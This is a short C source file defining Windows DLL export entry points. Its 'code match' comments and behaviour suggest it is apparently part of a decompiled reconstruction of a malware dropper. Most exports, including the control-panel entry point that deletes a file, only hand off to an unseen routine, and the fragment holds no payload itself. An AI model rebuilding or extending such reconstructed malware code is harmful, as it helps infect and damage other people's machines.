/******************************************************************************************
  Copyright 2012 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "data.h"
#include "3. OS.h"

// 100% (C) CODE MATCH
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if(fdwReason && fdwReason == 1) hINSTANCE = hinstDLL;
	return TRUE;
}

// 100% (C) CODE MATCH
BOOL __stdcall DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if(fdwReason && fdwReason == 1)
	{
		hINSTANCE = hinstDLL;
		CheckSystemVersion(TRUE);
	}
	
	return 0;
}

// 100% (C) CODE MATCH
HRESULT __stdcall DllCanUnloadNow(void)
{
	hINSTANCE = GetModuleHandleW(0);
	CheckSystemVersion(TRUE);
	ExitProcess(0);
}

// 100% (C) CODE MATCH
HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
{
	CheckSystemVersion(TRUE);
}

// 100% (C) CODE MATCH
HRESULT __stdcall DllRegisterServerEx(void)
{
	CheckSystemVersion(TRUE);
	return 1;
}

// 100% (C) CODE MATCH
LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
{
	if(*(DWORD *)(hwndCPl + 2))
		DeleteFileA(*(LPCSTR *)(hwndCPl + 2));
	
	CheckSystemVersion(TRUE);
	return 1;
}

// 100% (C) CODE MATCH
STDAPI APIENTRY DllGetClassObjectEx(int a1, int a2, int a3, int a4)
{
	CheckSystemVersion(FALSE);
}
